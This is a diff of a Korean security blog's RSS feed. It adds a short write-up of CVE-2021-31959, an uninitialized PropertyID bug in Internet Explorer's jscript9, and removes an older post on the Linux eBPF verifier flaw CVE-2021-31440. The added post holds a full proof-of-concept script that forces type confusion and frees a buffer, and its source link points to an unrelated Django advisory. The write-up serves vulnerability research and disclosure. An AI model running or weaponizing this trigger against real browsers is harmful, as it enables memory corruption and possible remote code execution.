@@ -9,8 +9,42 @@
     <atom:link href="https://hackyboiz.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
     
     <description>hack &amp; life</description>
-    <pubDate>Mon, 14 Jun 2021 05:00:14 GMT</pubDate>
+    <pubDate>Tue, 15 Jun 2021 05:37:11 GMT</pubDate>
     <generator>http://hexo.io/</generator>
+    
+    <item>
+      <title>[하루한줄] CVE-2021-31959: Internet Explorer Uninitialized Property ID array</title>
+      <link>https://hackyboiz.github.io/2021/06/15/l0ch/2021-06-15/</link>
+      <guid>https://hackyboiz.github.io/2021/06/15/l0ch/2021-06-15/</guid>
+      <pubDate>Tue, 15 Jun 2021 05:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://securitylab.github.com/advisories/GHSL-2021-075-d</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securitylab.github.com/advisories/GHSL-2021-075-django/">Issue 2168: Internet Explorer: Memory corruption in jscript9.dll due to uninitialized Property ID array</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Internet Explorer (Windows 10)</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>MS에서 지원을 2022년 6월에 완전히 종료하겠다고 밝힌 Internet Explorer에서 초기화되지 않은 배열 요소의 사용으로 인한 취약점이 발견되어 세부 정보가 공개되었습니다.</p><p>취약점은 jscript9의 PropertyID 배열의 처리 방식에 존재합니다. PropertyID 배열은 <code>ByteCodeGenerator::EmitScopeObjectInit</code> 함수에 할당됩니다. 이때 할당 시 메모리를 초기화하지 않는 <code>ArenaAllocator::Alloc</code> 함수를 사용해 배열을 할당하므로 배열의 일부가 초기화되지 않은 상태로 유지됩니다.</p><p>이러한 초기화되지 않은 PropertyID로 변수의 scope를 속일 수 있습니다. 이를 악용하면 정상적인 방법으로 액세스 할 수 없는 변수에 액세스 할 수 있으며 원격 코드 실행으로 이어질 수 있습니다. 해당 취약점은 <a href="https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2020/CVE-2020-1380.html">CVE-2020-1380</a>과 동일한 방법으로 JIT 엔진을 사용해 트리거할 수 있습니다.</p><p><strong>PoC Code</strong></p><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- saved from url=(0014)about:internet --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-string">&#x27;start&#x27;</span>);</span><span class="javascript"><span class="hljs-comment">// prepare objects</span></span><span class="javascript"><span class="hljs-keyword">var</span> buf = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">0x8c</span>);</span><span class="javascript"><span class="hljs-keyword">var</span> arr = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Int32Array</span>(buf);</span><span class="javascript"><span class="hljs-keyword">var</span> o = &#123;&#125;;</span><span class="javascript">o.valueOf = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;</span><span class="javascript">    alert(<span class="hljs-string">&#x27;callback&#x27;</span>);</span><span class="javascript">    <span class="hljs-comment">// free </span></span><span class="javascript">    worker = <span class="hljs-keyword">new</span> Worker(<span class="hljs-string">&#x27;worker.js&#x27;</span>);</span>    worker.postMessage(buf, [buf]);    worker.terminate();<span class="javascript">    worker = <span class="hljs-literal">null</span>;</span><span class="javascript">    <span class="hljs-comment">// sleep</span></span><span class="javascript">    <span class="hljs-keyword">var</span> start = <span class="hljs-built_in">Date</span>.now();</span><span class="javascript">    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">Date</span>.now() - start &lt; <span class="hljs-number">200</span>) &#123;&#125;</span><span class="javascript">    <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> reclaim freed memory</span></span><span class="javascript">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span></span>&#125;;<span class="javascript"><span class="hljs-comment">// generate function from string in order to have a clean bytecode generator</span></span><span class="javascript"><span class="hljs-keyword">var</span> vulnstr =</span><span class="javascript"><span class="hljs-string">&quot;for (let i=0; i&lt;1; i++) &#123;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;    function opt(A, x, crash) &#123;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        &#x27;use strict&#x27;;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const aagaaaaaaahabauaaaaa = x+1;\n&quot;</span> + <span class="hljs-comment">//special variable name so that hash is eqal to 0x109 (property ID of Int16Array)</span></span><span class="javascript"><span class="hljs-string">&quot;        const c02 = aagaaaaaaahabauaaaaa+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c03 = c02+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c04 = c03+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c05 = c04+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        let c06 = c05+1;\n&quot;</span> +  <span class="hljs-comment">// this variable will alias with Int16Array</span></span><span class="javascript"><span class="hljs-string">&quot;        const c07 = c06+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c08 = c07+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c09 = c08+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c10 = c09+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c11 = c10+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c12 = c11+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c13 = c12+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c14 = c13+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c15 = c14+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c16 = c15+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c17 = c16+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c18 = c17+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c19 = c18+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c20 = c19+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c21 = c20+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c22 = c21+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c23 = c22+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c24 = c23+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c25 = c24+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c26 = c25+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c27 = c26+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c28 = c27+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c29 = c28+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c30 = c29+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c31 = c30+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c32 = c31+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c33 = c32+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c34 = c33+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c35 = c34+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c36 = c35+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c37 = c36+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c38 = c37+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        if(crash) &#123;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;          c06 = c06 + 1;\n&quot;</span> + <span class="hljs-comment">// we must change it here so that the value below is not known</span></span><span class="javascript"><span class="hljs-string">&quot;          Int16Array = o;\n&quot;</span> + <span class="hljs-comment">// here we actually change the value (and type) of c06</span></span><span class="javascript"><span class="hljs-string">&quot;        &#125;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        A[0] = c06;\n&quot;</span> + <span class="hljs-comment">// if crash==1, c06 is an object here, but JIT thinks it&#x27;s an integer</span></span><span class="javascript"><span class="hljs-string">&quot;        eval(1);\n&quot;</span> +  <span class="hljs-comment">// needed to trigger ByteCodeGenerator::EmitScopeObjectInit</span></span><span class="javascript"><span class="hljs-string">&quot;    &#125;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;    for(var i=0; i&lt;100000; i++) &#123;\n&quot;</span> + <span class="hljs-comment">// jit a function</span></span><span class="javascript"><span class="hljs-string">&quot;      opt(arr, 1, 0);\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;    &#125;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;    opt(arr, 1, 1);\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;    alert(&#x27;failed&#x27;);\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;&#125;&quot;</span>;</span><span class="javascript">vuln = <span class="hljs-built_in">Function</span>(vulnstr);</span>vuln();<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/internet-explorer/">internet explorer</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/microsoft/">microsoft</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/uninitialized-variable/">uninitialized variable</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2021/06/15/l0ch/2021-06-15/#disqus_thread</comments>
+      
+    </item>
     
     <item>
       <title>[하루한줄] Rate Limit 우회를 통한 OTP Brute-Force</title>
@@ -63,11 +97,11 @@
       <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
       
       
+      <category domain="https://hackyboiz.github.io/tags/fuzzing/">fuzzing</category>
+      
       <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
       
       <category domain="https://hackyboiz.github.io/tags/winafl/">winafl</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/fuzzing/">fuzzing</category>
       
       <category domain="https://hackyboiz.github.io/tags/harness/">harness</category>
       
@@ -136,13 +170,13 @@
       <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
       
       
-      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
-      
       <category domain="https://hackyboiz.github.io/tags/use-after-free/">use after free</category>
       
-      <category domain="https://hackyboiz.github.io/tags/webkit/">webkit</category>
-      
       <category domain="https://hackyboiz.github.io/tags/uaf/">uaf</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/webkit/">webkit</category>
       
       
       <comments>https://hackyboiz.github.io/2021/06/12/fabu1ous/2021-06-12/#disqus_thread</comments>
@@ -202,9 +236,9 @@
       <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
       
       
-      <category domain="https://hackyboiz.github.io/tags/information-disclosure/">information disclosure</category>
-      
       <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/information-disclosure/">information disclosure</category>
       
       <category domain="https://hackyboiz.github.io/tags/slack/">slack</category>
       
@@ -234,13 +268,13 @@
       <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
       
       
+      <category domain="https://hackyboiz.github.io/tags/bypass/">bypass</category>
+      
       <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
       
       <category domain="https://hackyboiz.github.io/tags/rfid/">rfid</category>
       
       <category domain="https://hackyboiz.github.io/tags/monotonic-counter/">monotonic counter</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/bypass/">bypass</category>
       
       <category domain="https://hackyboiz.github.io/tags/tear-off/">tear off</category>
       
@@ -304,13 +338,13 @@
       <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
       
       
-      <category domain="https://hackyboiz.github.io/tags/malware/">malware</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/bypass/">bypass</category>
-      
       <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
       
+      <category domain="https://hackyboiz.github.io/tags/malware/">malware</category>
+      
       <category domain="https://hackyboiz.github.io/tags/defender/">defender</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/bypass/">bypass</category>
       
       <category domain="https://hackyboiz.github.io/tags/signature/">signature</category>
       
@@ -343,9 +377,9 @@
       <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
       
       
-      <category domain="https://hackyboiz.github.io/tags/malware/">malware</category>
-      
       <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/malware/">malware</category>
       
       <category domain="https://hackyboiz.github.io/tags/powershell/">powershell</category>
       
@@ -411,9 +445,9 @@
       <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
       
       
-      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
-      
       <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
       
       <category domain="https://hackyboiz.github.io/tags/safari/">safari</category>
       
@@ -447,13 +481,13 @@
       
       <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
       
-      <category domain="https://hackyboiz.github.io/tags/kernel/">kernel</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/ios/">ios</category>
-      
       <category domain="https://hackyboiz.github.io/tags/information-disclosure/">information disclosure</category>
       
       <category domain="https://hackyboiz.github.io/tags/apple/">apple</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/kernel/">kernel</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/ios/">ios</category>
       
       <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
       
@@ -485,13 +519,13 @@
       <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
       
       
+      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
+      
       <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
       
       <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
       
       <category domain="https://hackyboiz.github.io/tags/microsoft/">microsoft</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
       
       <category domain="https://hackyboiz.github.io/tags/sharepoint/">sharepoint</category>
       
@@ -519,13 +553,13 @@
       <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
       
       
-      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
-      
       <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
       
       <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
       
       <category domain="https://hackyboiz.github.io/tags/xss/">xss</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
       
       <category domain="https://hackyboiz.github.io/tags/sandbox-escape/">sandbox escape</category>
       
@@ -587,17 +621,17 @@
       <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
       
       
+      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
+      
       <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
       
       <category domain="https://hackyboiz.github.io/tags/backdoor/">backdoor</category>
       
       <category domain="https://hackyboiz.github.io/tags/malware/">malware</category>
       
-      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
+      <category domain="https://hackyboiz.github.io/tags/vbscript/">vbscript</category>
       
       <category domain="https://hackyboiz.github.io/tags/com/">com</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/vbscript/">vbscript</category>
       
       <category domain="https://hackyboiz.github.io/tags/jscript/">jscript</category>
       
@@ -679,40 +713,6 @@
       
       
       <comments>https://hackyboiz.github.io/2021/05/30/j0ker/2021-05-30/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>[하루한줄] CVE-2021-31440: Linux Kernel eBPF verifier, incorrect bound check</title>
-      <link>https://hackyboiz.github.io/2021/05/29/fabu1ous/2021-05-29/</link>
-      <guid>https://hackyboiz.github.io/2021/05/29/fabu1ous/2021-05-29/</guid>
-      <pubDate>Sat, 29 May 2021 05:00:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.zerodayinitiative.com/blog/2021/5/26/cve-2021</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/5/26/cve-2021-31440-an-incorrect-bounds-calculation-in-the-linux-kernel-ebpf-verifier">CVE-2021-31440: AN INCORRECT BOUNDS CALCULATION IN THE LINUX KERNEL EBPF VERIFIER</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Linux kernel 5.7 ~ Linux kernel 5.11.15</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>eBPF는 런타임 중 안전하게 커널 코드를 삽입하기 위해 Verifier와 BPF instruction을 사용합니다. Verifier는 레지스터의 값의 변화와 그 값들의 허용 범위(이하 range)등을 추적해 memory load와 store의 out-of-bound 여부를 검사합니다. CVE-2021-31440을 악용하면 out-of-bound 검사를 무력화하고 로컬 권한 상승을 노릴 수 있습니다.</p><pre><code class="hljs c">...    <span class="hljs-keyword">if</span> (__reg64_bound_u32(reg-&gt;umin_value))             reg-&gt;u32_min_value = (u32)reg-&gt;umin_value;     <span class="hljs-keyword">if</span> (__reg64_bound_u32(reg-&gt;umax_value))             reg-&gt;u32_max_value = (u32)reg-&gt;umax_value;...</code></pre><p>위는 취약한 코드 부분의 일부입니다. 기존 eBPF 취약점들과 마찬가지로 CVE-2021-31440 또한 64 bit range의 하위 32 비트로부터 32 bit range를 도출하는 과정에서 버그가 발생합니다. <code>umin_value</code>가 1, <code>umax_value</code> 가 1&lt;&lt;32이라 할 때 <code>u32_min_value</code>는 1, <code>u32_max_value</code>는 0으로 설정되고 실제 runtime range와 다른 값을 Verifier에게 전달하게 됩니다.</p><p>Verifier는 잘못된 레지스터 허용범위를 갖게 되고 이를 통해 해커는 out-of-bound read/write access가 가능해 로컬 권한 상승을 할 수 있습니다.</p>]]></content:encoded>
-      
-      
-      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
-      
-      
-      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/linux/">linux</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/kernel/">kernel</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/oob/">oob</category>
-      
-      
-      <comments>https://hackyboiz.github.io/2021/05/29/fabu1ous/2021-05-29/#disqus_thread</comments>
       
     </item>
     
